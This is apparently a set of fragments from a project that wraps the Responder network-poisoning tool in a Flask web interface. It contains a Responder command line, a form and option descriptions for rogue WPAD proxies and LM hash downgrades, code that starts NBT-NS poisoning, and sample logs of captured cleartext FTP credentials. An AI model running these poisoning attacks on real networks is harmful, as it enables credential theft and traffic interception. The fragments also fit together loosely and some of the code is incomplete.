responder -I wlan0 -dvw


        <!-- Functionalities -->
        <div class="form_group">
          {% set functionalities = [ {'name': 'analyze', 'label': 'Analyze
          Mode'}, {'name': 'basic', 'label': 'Return Basic HTTP
          Authentication'}, {'name': 'wredir', 'label': 'Enable NetBIOS
          Wredir'}, {'name': 'NBTNSdomain', 'label': 'Enable NetBIOS Domain'},
          {'name': 'fingerprint', 'label': 'Fingerprint Hosts'}, {'name':
          'wpad', 'label': 'Start WPAD Rogue Proxy Server'}, {'name':
          'ForceWpadAuth', 'label': 'Force WPAD Authentication'}, {'name': 'lm',
          'label': 'Force LM Hashing Downgrade'}, {'name': 'verbose', 'label':
          'Increase Verbosity'} ] %} {% for func in functionalities %}
          <label style="display: flex; align-items: center;"
            ><input style="margin: 0.5rem" type="checkbox" name="{{ func.name }}" /> {{ func.label
            }}</label
          ><br />
          {% endfor %}
        </div>
        
        
        
        

    # Initialize settings
    options = {
        'Analyze': analyze == 'on',
        'Interface': interface,
        'Basic': basic == 'on',
        'Wredirect': wredir == 'on',
        'NBTNSDomain': nbt_domain == 'on',
        'Finger': fingerprint == 'on',
        'WPAD_On_Off': wpad == 'on',
        'Upstream_Proxy': upstream_proxy,
        'Force_WPAD_Auth': force_wpad_auth == 'on',
        'LM_On_Off': lm == 'on',
        'Verbose': verbose == 'on'
    }
    
    # Apply settings from form to the Responder config
    settings.Config.populate(options)
    
    # Start the responder in a separate thread to avoid blocking the Flask app
    thread = threading.Thread(target=run_responder)
    thread.start()
    
    return jsonify({'message': 'Responder started with the selected options!'})

def run_responder():
    # Similar to the original main() in Responder but adapted for the Flask flow
    try:
        banner()  # Print banner
        settings.init()
        settings.Config.ExpandIPRanges()
        
        if settings.Config.AnalyzeMode:
            print(color('[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1))

        threads = []

        # Add the functionality of LLMNR, MDNS, NBT-NS poisoners, and other services based on user input
        from poisoners.LLMNR import LLMNR
        from poisoners.NBTNS import NBTNS
        from poisoners.MDNS import MDNS
        threads.append(threading.Thread(target=serve_NBTNS_poisoner, args=('', 137, NBTNS)))

        # Conditionally add other services based on user selections
        if settings.Config.WPAD_On_Off:
            from servers.HTTP_Proxy import HTTP_Proxy
            threads.append(threading.Thread(target=serve_thread_tcp, args=('', 3141, HTTP_Proxy)))

        # Start all threads
        for thread in threads:
            thread.setDaemon(True)
            thread.start()

        print(color('[+]', 2, 1) + " Listening for events...")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        sys.exit("\r%s Exiting..." % color('[+]', 2, 1))






[FTP] Cleartext Client   : 192.168.137.171
[FTP] Cleartext Username : anonymous
[FTP] Cleartext Password : IEUser@



[SMTP] Cleartext Client   : 192.168.137.171
[SMTP] Cleartext Username : NTLMSSP


[SMTP] Cleartext Client   : 192.168.137.171
[SMTP] Cleartext Username : NTLMSSP


[FTP] Cleartext Client   : 192.168.137.171
[FTP] Cleartext Username : anonymous
[FTP] Cleartext Password : IEUser@



{ 'name': "analyze", 'description': "Runs Responder in a passive mode where no responses (poisoning) are sent, and it just listens to requests. This is useful for analysis without interacting with or altering the target network.", 'check': "enable option: -A" }, 

{ 'name': "httpAuth", 'description': "Enables Basic HTTP Authentication instead of the default NTLM (NT LAN Manager) authentication for HTTP-based attacks.", 'check': "enable option: -b" }, 

{ 'name': "netbiosw", 'description': "Enables responses for NetBIOS workstation redirector suffix queries. This is a specific type of NetBIOS poisoning attack.", 'check': "enable option: -r" }, 

{ 'name': "netbiosd", 'description': "Enables responses for NetBIOS domain suffix queries. This targets specific queries related to the domain environment.", 'check': "enable option: -d" }, 

{ 'name': "fingerprinting", 'description': "Enables host fingerprinting, allowing Responder to gather information about the host making NBT-NS (NetBIOS Name Service) or LLMNR (Link-Local Multicast Name Resolution) queries.", 'check': "enable option: -f" }, 

{ 'name': "wpads", 'description': "Starts a rogue WPAD (Web Proxy Auto-Discovery Protocol) server, which can be used to perform man-in-the-middle (MITM) attacks via automatic proxy discovery on a target network.", 'check': "enable option: -w" }, 

{ 'name': "uwpad", 'description': "Specifies an upstream HTTP proxy that the rogue WPAD server will use to forward traffic. This allows Responder to relay traffic to an actual proxy while still capturing authentication credentials.", 'check': "enable option: -u" }, 

{ 'name': "fwpad", 'description': "Forces the client to authenticate when retrieving the wpad.dat file, which is part of the WPAD auto-configuration process.", 'check': "enable option: -F" },


{ 'name': "flmhashing", 'description': "Forces the target to use weaker LM (LAN Manager) hashes, which are easier to crack. This option is relevant when dealing with older Windows systems that still support LM hashing.", 'check': "enable option: --lm" }, 

{'name': "verbose", 'description': "Increases the verbosity of the tool, providing more detailed output and logging.", 'check': "enable option: -v" }
